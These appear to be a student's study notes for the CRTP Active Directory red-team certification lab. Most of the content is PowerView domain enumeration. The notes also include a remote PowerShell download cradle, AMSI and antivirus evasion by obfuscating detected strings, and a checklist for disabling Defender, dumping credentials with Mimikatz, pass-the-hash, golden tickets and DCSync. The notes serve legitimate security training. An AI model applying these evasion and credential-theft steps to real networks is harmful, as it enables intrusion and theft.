# CRTP One Week Challenge

# PowerShell

Bypassing PowerShell Security using Invisi-Shell  (https://github.com/OmerYa/Invisi-Shell)
```
RunWithPathAsAdmin.bat  (Admin Privilege)
RunWithRegistryNonAdmin.bat  (non-Admin Privilege)
```

Load a script and module (local)
```
. C:\AD\Tools\PowerView.ps1
OR
Import-Module C:\AD\Tools\PowerView.ps1
```

list all the commands u can use in a particular module
```
Get-Command -Module <modulename>
```

Load a script and module (remotely)
-     ine (New-Object Net.WebClient).DownloadString('http://10.10.16.10/payload.ps1')

Bypassing AV Signatures for PowerShell
.      Invoke-Mimi & Invoke-MimiEx are the obfuscated tools of Invoke-Mimikatz
.      if u r going to run a PowerShell script from the disk it may get detected; u can use the AMSITrigger (https://github.com/RythmStick/AMSITrigger) tool to identify the exact part of a script that is detected
.      Scan using AMSITrigger 'AmsiTrigger_x64.exe -i PowerUp.ps1' | Modify the detected code by reversing ex. 'System.AppDomain' to 'niamoDppA.metsyS' | Rescan using AMSITrigger | Repeat the steps till u get a result as "AMSI_RESULT_NOT_DETECTED"
.      u can use DefenderCheck (https://github.com/t3hbb/DefenderCheck) to identify code and strings from a binary / file that Windows Defender may flag
.      simply provide path to the script file to scan it
-     AmsiTrigger_x64.exe -i C:\AD\Tools\Invok-PowerShellTcp_Detected.ps1 DefenderCheck.exe PowerUp.ps1
.      for full obfuscation of PowerShell scripts use Invoke-Obfuscation (https://github.com/danielbohannon/Invoke-Obfuscation)
example of minimal obfuscation; if u run powerup.ps1 and the following line got detected "New-Object System.Net.Sockets.TCPClient($IP,$PORT)"
## Reverse the "Net.Sockets" string on line number 32
```
$string = "stekcoS.teN"
$class = ([regex]::Matches($String,'.','RightToLeft') | ForEach {$_.value}) -join ''
if ($Reverse)
{
$client = New-Object System.$class.TCPClient($IPAddress,$PORT)
}
```

# Methodology Master
---
## 0. Miscellaneous
> 1. [ ] Remember to bypass AMSI on every new user
> 2. [ ] Check the Execution policy language mode
> 3. [ ] Check all the commands you are allowed to execute

## 1. Domain Enumeration
> 1. [ ] Complete basic Enum
> 2. [ ] enumerate all users
> 3. [ ] enumerate all domain computers
> 4. [ ] GPO && OU
> 5. [ ] ACL's 
> 6. [ ] Trusts
> 7. [ ] Blood-hound
> 8. [ ] SPN

## 2. Local Priv Esc
> 1. [ ] Run *powerups.ps1*
> 2. [ ] **ServiceUnquoted**
> 3. [ ] **ModifiableServiceFile**
> 4. [ ] **ModifiableService**
> 5. [ ] Priv Esc for the above use : **Invoke-ServiceAbuse**
> 6. [ ] **whoami /all** || **whoami /priv**
> 7. [ ] Check Windows abuse and priv esc
> 8. [ ] Hunt for Local Admin users if available from Trust Enum
> 9. [ ] Priv Esc for the above use : PSsession or refer **Invoke-Command**
> 10. [ ] Check if you can Priv esc using *jenkins*
> 11. [ ] Lastly add the user to the localgroup administrators

**NOTE : ONCE A LOCAL ADMINISTRATOR RUN PS as ADMINISTRATOR**

## 3. Domain Admin Priv Esc
> 1. [ ] Hunt for Local Admin Users
> 2. [ ] Check The local Admin Access
> 3. [ ] If yes, Use **Invoke-Command** or **Enter-PSSession**

## 4. Domain Admin Persistence [app locker enabled]
> 1. [ ] Check the Execution policy language mode
> 2. [ ] Checking AppLockerPolicy and note the paths available for us
> 3. [ ] Disable Defender protections
> 4. [ ] Modify Invoke-Mimikatz.ps1 script to call the function in the script itself because we can't dot source files if in constrained language mode
> 5. [ ] run script without dot sourcing it
> 6. [ ] Dump the hashes
> 7. [ ] Get the ekeys
> 8. [ ] Get Credentials from the credentials vault

## 5. Domain Admin Persistence
> 1. [ ] Dump the hashes us the user using *Invoke-Mimikatz*
> 2. [ ] Get the ekeys
> 3. [ ] Get Credentials from the credentials vault
> 4. [ ] Using *Over-Pass-the-Hash Attack* spawn a PowerShell session as that user

## 6. New user from DA Priv Esc
> 1. [ ] Follow the same exact steps from **3. to 5.** if a new user is found

## 7. DC pwn
> 1. [ ] After we get a DA user with Administrator access we can connect to the DC using **Enter-PSSession**

## 8. Domain Controller Persistence
> 1. [ ] Golden Ticket
> 2. [ ] Silver Ticket
> 3. [ ] DSRM
> 4. [ ] ACL AdminSDHolder
> 5. [ ] ACL DCSync
> 6. [ ] ACL security Descriptors

## 9. Forest Priv Esc

> 1. [ ] Forge inter-forest ticket by trust keys

---

# Domain Enumeration - Basic
Enumerate following for the dollarcorp domain:
> 1. [ ] Users
> 2. [ ] Computers
> 3. [ ] Domain Administrators
> 4. [ ] Enterprise Administrators
- run Invisi-Shell then PowerView before Domain Enumeration
```
RunWithRegistryNonAdmin.bat
. C:\AD\Tools\PowerView.ps1
```
Get current domain
```
Get-NetDomain
```
Get object of another domain
```
Get-NetDomain -Domain moneycorp.local
```
Get domain SID for the current domain  (security identifier)
```
Get-DomainSID
```
Get domain policy for the current domain
```
Get-DomainPolicy
(Get-DomainPolicy)."system access"
```
Get domain policy for another domain
```
(Get-DomainPolicy)."KerberosPolicy" #Kerberos tickets info(MaxServiceAge)
(Get-DomainPolicy)."SystemAccess" #Password policy
(Get-DomainPolicy).PrivilegeRights #Check your privileges
# OR
(Get-DomainPolicy -domain moneycorp.local)."system access"
(Get-DomainPolicy -domain moneycorp.local)."kerberos policy"
(Get-DomainPolicy -domain moneycorp.local)."Privilege Rights"
```
Get domain controllers for the current domain
```
Get-NetDomainController
```
Get domain controllers for another domain
```
Get-NetDomainController -Domain moneycorp.local
```
Get a list of all users in the domain
```
Get-DomainUser  #OR  Get-NetUser
Get-DomainUser -Identity student1  #OR  Get-NetUser -Username student1
Get-DomainUser -Identity student1 -Properties *
Get-DomainUser | select samaccountname,logonCount  #Get all usernames only in the domain
Get-DomainUser -LDAPFilter "Description=*built*" | select name,Description
```
Get list of all properties for users in the current domain
```
Get-UserProperty
Get-UserProperty -Properties pwdlastset,logoncount,badpwdcount
Get-UserProperty -Properties logoncount
Get-UserProperty -Properties badpwdcount
```
Get a list of computers in the current domain
```
Get-DomainComputer
Get-DomainComputer | select cn,logonCount
Get-DomainComputer -OperatingSystem "*Server 2016*"
Get-DomainComputer -Ping
Get-DomainComputer -FullData
```
Get all the groups in the current domain
```
Get-DomainGroup | select name
Get-DomainGroup -Domain <targetdomain> | select cn
Get-DomainGroup -FullData
Get-NetComputer -Domain
```
Get all groups containing the word "admin" in group name
```
Get-DomainGroup *admin*
Get-DomainGroup -GroupName *admin*
Get-DomainGroup *admin* -FullData
Get-DomainGroup -GroupName *admin* -Doamin moneycorp.local
```
Get all the members of the Domain Admins group
```
Get-DomainGroupMember -Identity "Domain Admins" -Recurse  #alwas check the RID in SID if it is 500; if yes means user is admin 
```
Get the group membership for a user
```
Get-DomainGroup -UserName "student1" | select name
```
List all the local groups on a machine (needs administrator privs on non-dc machines)
```
Get-NetLocalGroup -computerName dcorp-dc
Get-NetLocalGroup -ComputerName dcorp-dc.dollarcorp.moneycorp.local -ListGroups
```
Get members of all the local groups on a machine (needs administrator privs on non-dc machines)
```
Get-NetLocalGroup -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Recurse
```
Get members of the local group "Administrators" on a machine (needs administrator privs on non-dc machines)
```
Get-NetLocalGroupMember -ComputerName dcorp-dc -GroupName Administrators
```
Get actively logged users on a computer (needs local admin rights on the target)
```
Get-NetLoggedon -ComputerName dcorp-dc.dollarcorp.moneycorp.local 
```
Get locally logged users on a computer (needs remote registry on the target - started by-default on server OS)
```
Get-LoggedonLocal -ComputerName dcorp-dc.dollarcorp.moneycorp.local 
```
Get the last logged user on a computer (needs administrative rights and remote registry on the target)
```
Get-LastLoggedon -ComputerName <servername>
```
Find shares on hosts in current domain.
```
Invoke-ShareFinder -Verbose
```
Find sensitive files on computers in the domain
```
Invoke-FileFinder -Verbose
```
Get all fileservers of the domain
```
Get-NetFileServer
```
Enumerate Enterprise Administrators
```
Get-DomainGroupMember -Name "Enterprise Admins" -Domain moneycorp.local
```

# Domain Enumeration - Group Policy Object Enumeration
Enumerate the following for the dollarcorp domain:
> 1. [ ] List all the OUs
> 2. [ ] List all the computer in the StudentMachines OU
> 3. [ ] List the GPOs
> 4. [ ] Enumerate GPO applied on the StudentMachines OU
Get list of GPO in current domain.
```
Get-DomainGPO | select displayname
Get-DomainGPO -ComputerName dcorp-student1.dollarcorp.moneycorp.local
```
List all the computer in the StudentMachines OU
```
(Get-Domain -Identity StudentMachines).distinguishedname | %{Get-DomainComputer -SearchBase $_} | select name
```
Get GPO(s) which use Restricted Groups or groups.xml for interesting users
```
Get-DomainGPOLocalGroup
```
Get users which are in a local group of a machine using GPO
```
Get-DomainGPOComputerLocalGroupMapping -ComputerIdentity dcop-student1
```
Get machines where the given user is member of a specific group
```
Get-DomainGPOUserLocalGroupMapping -Identity student -Verbose
```
Get OUs in a domain
```
Get-DomainOU
```
Get GPO applied on an OU. Read GPOname from gplink attribute from Get-NetOU
```
Get-DomainGPO -Identity "{AB306569-220D-43FF-BO3B-83E8F4EF8081}"
```

# Domain Enumeration - Access Control List Enumeration  (better to use bloodhound)
Get the ACLs associated with the specified object (groups)
```
Get-DomainObjectAcl -SamAccountName student1 -ResolveGUIDs
```
Get the ACLs associated with the specified prefix to be used for search
```
Get-DomainObjectAcl -ADSprefix 'CN=Administrator,CN=Users' -Verbose
```
We can also enumerate ACLs using ActiveDirectory module but without resolving GUIDs
```
(Get-Acl "AD:\CN=Administrator, CN=Users, DC=dollarcorp, DC=moneycorp,DC=local").Access
```
Get the ACLs associated with the specified LDAP path to be used for search
```
Get-DomainObjectAcl -SearchBase 'LDAP://CN=DomainAdmins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local' -ResolveGUIDs -Verbose
```
Search for interesting ACEs
```
Find-InterestingDomainAcl -ResolveGUIDs
```
Get the ACLs associated with the specified path
```
Get-PathAcl -Path "\\dc.mydomain.local\sysvol" 
```

# Domain Enumeration - Trusts Enumeration
Enumerate all domains in the moneycorp.local forest:
> 1. [ ] Map the trusts of the dollarcorp.moneycorp.local domain
> 2. [ ] Map External trusts in meneycorp.local forest
> 3. [ ] Identify external trusts of dollarcorp domain.
Get a list of all domain trusts for the current domain
```
Get-DomainTrust
Get-DomainTrust -Domain us.dollarcorp.moneycorp.local
```
Get details about the current forest
```
Get-Forest
Get-Forest -Forest eurocorp.local
```
Get all domains in the current forest
```
Get-ForestDomain
Get-ForestDomain -Forest eurocorp.local
```
Get all global catalogs for the current forest
```
Get-ForestGlobalCatalog
Get-ForestGlobalCatalog -Forest eurocorp.local
```
Map trusts of a forest
```
Get-ForestTrust
Get-ForestTrust -Forest eurocorp.local
```
Map External trusts in meneycorp.local forest
```
Get-ForestDomain | %{Get-DomainTrust -Domain $_.Name} | ?{$_.TrustAttributes -eq "FILTER_SIDS"}
```

# User Hunting
Find all machines on the current domain where the current user has local admin access (admin access in another machine)
```
Find-LocalAdminAccess -Verbose
```
Find computers where a domain admin (or specified user/group) has sessions
```
powershell -ep bypass   #If u get an error module can't be loaded
. C:\AD\Tools\Invoke-SessionHunter.ps1
Invoke-SessionHunter
```
To confirm admin access
```
Invoke-UserHunter -CheckAccess
```
Find computers where a domain admin is logged-in
```
Invoke-UserHunter -Stealth
```
Get users with privileges in other domains inside the forest
```
Get-DomainForeingUser 
```
Get groups with privileges in other domains inside the forest
```
Get-DomainForeignGroupMember 
```

# BloodHound Enumeration
Enable Sharp-Hound and execute
```
. .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All,LoggedOn
Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip
```
To avoid detections like ATA
```
Invoke-BloodHound -CollectionMethod All -ExcludeDC
```
Start neo4j and BloodHound UI on kali machine and load the zip/json files
```
sudo neo4j console&;bloodhound&
```
